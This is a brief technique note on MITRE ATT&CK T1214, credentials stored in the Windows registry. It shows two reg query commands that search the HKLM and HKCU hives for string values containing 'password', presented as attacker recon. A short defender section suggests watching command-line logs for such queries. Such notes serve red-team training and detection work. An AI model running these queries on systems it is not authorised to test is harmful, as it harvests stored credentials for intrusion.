---
description: 'Internal recon, hunting for passwords in Windows registry'
---

# T1214: Credentials in Registry

## Execution

Scanning registry hives for the value `password`:

{% code title="attacker@victim" %}
```csharp
reg query HKLM /f password /t REG_SZ /s
# or
reg query HKCU /f password /t REG_SZ /s
```
{% endcode %}

## Observations

As a defender, you may want to monitor commandline argument logs and look for any that include `req query` and `password`strings:

![](../../.gitbook/assets/passwords-registry.png)

## References

{% embed url="https://attack.mitre.org/wiki/Technique/T1214" %}

